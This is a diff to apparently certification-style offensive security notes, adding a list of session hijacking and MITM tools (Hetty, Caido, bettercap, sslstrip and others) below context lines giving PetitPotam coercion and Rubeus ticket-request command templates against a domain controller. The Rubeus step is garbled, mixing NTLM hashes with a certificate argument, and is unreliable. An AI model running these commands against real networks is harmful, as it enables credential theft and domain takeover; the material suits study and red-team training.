@@ -3499,3 +3499,12 @@ Use Different Techniques to Conceal Malicious Programs and Maintain Remote Acces
 					=> python3 PetitPotam.py <Attacker’s IP> <IP of DC>
 				- After obtaining the NTLM hashes, use password-cracking tools like Rubeus to request a Kerberos ticket for the machine containing DC account privileges:
 					=> Rubeus.exe asktgt /outfile:<output_file.kirbi> /dc:<DC-IP> /domain:<domain name> /user:<Domain username> /ptt /certificate:<NTLM hashes received from above command>
+- Session Hijacking Tools:
+	- Hetty (github.com) :  Hetty is an HTTP toolkit designed for security research, enabling attackers to perform man-in-the-middle (MITM) HTTP proxy attacks. It utilizes logs and advanced search functionalities to enhance the attack process. Hetty offers several features, including a MITM HTTP proxy with logging and advanced search capabilities, an HTTP client for manually creating and editing requests as well as replaying proxied ones, and the ability to intercept and manually review requests and responses by editing, sending, receiving, or canceling them.
+	- Caido (caido.io) : Caido is a web security auditing toolkit designed for security professionals to intercept and view HTTP requests in real time while browsing. It allows customization and testing of requests against large wordlists, automatically modifies incoming requests using regex rules, and enables the manual resending of requests to test endpoints.
+	- bettercap (www.bettercap.org) : Bettercap is a portable framework written in Go that enables security researchers, red teamers, and reverse engineers to perform reconnaissance and execute various attacks on Wi-Fi networks, Bluetooth Low Energy devices, wireless HID devices, and IPv4/IPv6 networks.
+	- Burp Suite (portswigger.net)
+	- OWASP ZAP (www.zaproxy.org)
+	- WebSploit Framework (sourceforge.net)
+	- sslstrip (pypi.org)
+	- JHijack (sourceforge.net)
